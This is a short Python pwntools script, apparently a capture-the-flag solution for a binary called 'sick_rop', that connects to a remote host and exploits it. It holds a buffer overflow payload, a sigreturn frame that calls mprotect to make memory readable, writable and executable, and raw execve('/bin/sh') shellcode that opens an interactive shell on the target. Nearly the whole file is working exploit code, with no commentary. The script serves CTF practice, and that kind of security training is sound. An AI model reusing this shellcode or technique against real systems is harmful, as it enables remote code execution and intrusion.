from pwn import *

context.binary = exe = ELF('./sick_rop')

# io = process()
# gdb.attach(io,api=True)
io = remote('209.97.140.29', 32199)

ret = 0x40104e
syscall = 0x40102b

payload = b'i'*40
payload += p64(exe.sym['vuln']) + p64(syscall)
frame = SigreturnFrame()
frame.rax = 10 # sys_mprotect
frame.rdi = 0x400000 # start
frame.rsi = 0x2000 # length
frame.rdx = 0x7 # rwx
frame.rsp = 0x4010f0
frame.rip = syscall
payload += bytes(frame)

io.sendline(payload)
io.recvline()
io.sendline(b'a'*14)
io.recvuntil(b'a\n')

payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'.ljust(40, b'\x90') + p64(0x4010c8)
io.sendline(payload)

io.interactive()